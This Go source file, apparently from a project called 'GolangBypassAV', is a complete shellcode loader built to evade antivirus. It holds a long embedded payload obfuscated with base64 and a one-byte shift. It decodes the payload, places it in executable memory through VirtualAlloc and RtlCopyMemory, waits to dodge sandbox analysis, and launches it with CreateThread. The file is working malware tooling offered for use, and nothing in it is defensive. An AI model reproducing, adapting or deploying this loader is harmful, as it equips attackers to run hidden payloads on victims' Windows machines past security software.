package main

import (
	"GolangBypassAV/encry"
	"encoding/base64"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var kk = []byte{0x11}

var (
	kernel32     = syscall.MustLoadDLL("kernel32.dll")
	ntdll        = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
	CreateThread = kernel32.MustFindProc("CreateThread")

	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func base64Decode(data string) []byte {
	data1, _ := base64.StdEncoding.DecodeString(data)
	return data1
}

func base64Encode(data []byte) string {
	bdata := base64.StdEncoding.EncodeToString(data)
	return bdata
}

func getEnCode(data []byte) string {
	bdata := base64.StdEncoding.EncodeToString(data)

	bydata := []byte(bdata)
	var shellcode []byte

	for i := 0; i < len(bydata); i++ {
		shellcode = append(shellcode, bydata[i]+kk[0])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

func getDeCode(string2 string) []byte {

	ss, _ := base64.StdEncoding.DecodeString(string2)
	string2 = string(ss)
	var shellcode []byte

	bydata := []byte(string2)

	for i := 0; i < len(bydata); i++ {
		shellcode = append(shellcode, bydata[i]-kk[0])
	}
	ssb, _ := base64.StdEncoding.DecodeString(string(shellcode))
	return ssb

}

func checkError(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func genEXE(charcode []byte) {

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(5 * time.Second)
	//syscall.Syscall(addr, 0, 0, 0, 0)
	CreateThread.Call(0, 0, addr, 0, 0, 0)
}

func gd() int64 {
	time.Sleep(time.Duration(2) * time.Second)

	dd := time.Now().UTC().UnixNano()
	return dd + 123456

}

func getFileShellCode(file string) []byte {
	data := encry.ReadFile(file)
	//shellCodeHex := encry.GetBase64Data(data)
	//fmt.Print(shellCodeHex)
	return data
}

func getFileShellCode1(file string) string {
	data := encry.ReadFile(file)
	shellCodeHex := base64Encode(data)
	fmt.Print(shellCodeHex)
	return shellCodeHex
}

func main() {
	//fmt.Println(1)

	//fmt.Print(getEnCode(getFileShellCode("C:\\Users\\Administrator\\Desktop\\payload.bin")))

	bbdata := "QFZ6VUZhVYCKUlJSUlZXY2JnU2RmZ2taXnVbfWRahWRqVnpdZnl5WnpCWnhkWoWKZlZ4YYVBgVxlZVlbZFVZUoNViXl3UlqEWlZZU4piQlNSdFl6SGdbU2Zmel1melRdYnuJWlJ1U354aXhqVIhbQnSAhlJ6UlJSUlZ6V4hZY39kUlliZlqFWlhWZF1iVFNbUnVVe2d8e0CKZlhdX1p5WlJ1a19edH1aXnRUhGJ0WVtVZlZTiGV7eHV3V15SQYh8VFZmRkFpaWpoVmRdYlRjW1J1U35iaoReZFZkXWJTiVtSdVNTeohkWmRSWWJiZ3lTaFdGa2h8V2piZ31TaHx6VUhUU1Nmh0B4aFZXa2h8el1Whn1hQEBAQGlogFJkc0ZEcmhGgXN+Z0FSVldoZGp/fmVaf4lic4FedYpqWUBKZ1pedH1aXnVbX150U19edH1TZlZXYmJzgEdnf35/QEppg3RCgVp6dFdThlRSVVJSU19edH1TZmZXY3J4X1NmZlhHZ0V+d4mHQGdHQn1zZFp/U2RVWWRkan9qZWVZW2Z+eFJSfFRWZn1bU4aGhWdde4dAQmZ6W4l8elWIQlOCVH1KWnp3V1p6dYFbiUlVQEBAQEBlZVlbZn1bU4Z6QVhYWYdAQmppUlVFaHVSYlJSZGFAYVVFZF5SYlJSR0phgUZSVlJSYHp6QEBAQF1EfUdfi15SfGtoZ3VVdWZScnpKgHJlW1eBRlOFhkaAalZfhmJzc0J5gF14a4p+QHmDemZFd0d8X0mFfWmIi31HcoJYf3mIamSIYIODX15GQGKGYXN4Z1dkf4tHSIZiRIl6ZWpJhINbdlJTZ3RDZ4pdZld/a2hGQWB6U19zRIGBc1iJeV2LZoZeVFKAakNKhXRYV0FyaFuEa2WEeGVnX1tjZFJGXXtSSFpZV3xraV+DWlVahl9URYlee2qLXXtaiF6LhHhnQ32Ga1hKRHSKU2BnVFJDXXtWSFpXdWFni2pBYIpTZnR+fXxraEZBXYtmhl5UfF9UeFJpaX9Dh0JIc2dUSF92il9ci19nQ4lFa0p+g3t6f0iKiWRkfmlnQ35ad3J6UouFglNog3VaXHRagEpaYEpBf4hpfXuLYXR7RXpKZlVqZmJTa2JKSEBZaEB+WXuJholGaEZkRohUZIFCRFViSGWIY354c1aIRVNSiFlIRWN5YXiHfHJDRYE8doRgflxXRX5KSnVnSUqFW3pZeHqEVmlaWkNBRH6Gi4ZeY4hWaH2Ee1hdYWB6X0VBfmBbd1l7Q3xkh1pHWkFKaIBHYmZ3RFV2dEZnWGGJe1lIfkOHc1Z0Z0dzQXeAg4BJVFyKdWSJWkhocoVIWn1lWGeJgXp2gUaDW35nX1mDRXVFi1pSYnNIiIVyW2hASmdaXnR+R1JSU1JSVlhFUlNSUlJWWEZiUlJSUlZYR2hcY2VGd0BnZFtfZWZBeltGQXpbSWZ6W0N8WEVSVFJSUlZ+WzxmWEdWgXJbRYdAZ2RaYVZaWmlSdV1rfnqIdVpSdGBXiFlpaWhXeWpkUmZSUlJSUmZeYYB/QERAQItWil56RUZde1ZCX4pFiV57WlJWe2NodlJOTg=="
	shellCodeHex := getDeCode(bbdata)
	gd()
	genEXE(shellCodeHex)
}
